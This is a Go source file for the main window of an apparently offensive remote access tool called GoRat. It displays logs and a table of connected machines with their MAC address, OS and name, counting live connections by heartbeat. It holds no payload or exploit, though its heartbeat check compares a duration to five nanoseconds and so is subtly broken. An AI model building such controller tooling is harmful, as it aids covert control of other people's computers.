package windows

import (
	"fmt"
	"time"

	"github.com/NotKatsu/GoRat/modules/database"

	"github.com/NotKatsu/GoRat/modules/gui/components"

	go_rat "github.com/AllenDang/giu"
)

func connectedMachines() int64 {
	var connectionCount int64
	connections := database.GetConnections()

	for _, conn := range connections {
		storedTime, err := time.Parse("2006-01-02 15:04:05.999999999-07:00", conn.LastHeartbeatTime)

		if err != nil {
			fmt.Println("Error parsing time:", err)
		}
		currentTime := time.Now()
		timeDifference := currentTime.Sub(storedTime)

		if timeDifference < 5 {
			connectionCount += 1
		}
	}
	return connectionCount
}
func MainWindow() {
	go_rat.SingleWindow().Layout(

		go_rat.Label(fmt.Sprint("Logs:")),
		go_rat.ListBox("Logs", components.CreateClientArray()).Size(go_rat.Auto, 200),

		go_rat.Label(fmt.Sprintf("Connected Machines (%d)", connectedMachines())),

		go_rat.Table().Columns(
			go_rat.TableColumn("MAC Address"),
			go_rat.TableColumn("OS"),
			go_rat.TableColumn("Name"),
			go_rat.TableColumn("Connected?")).Rows(components.CreateClientTable()...))
}
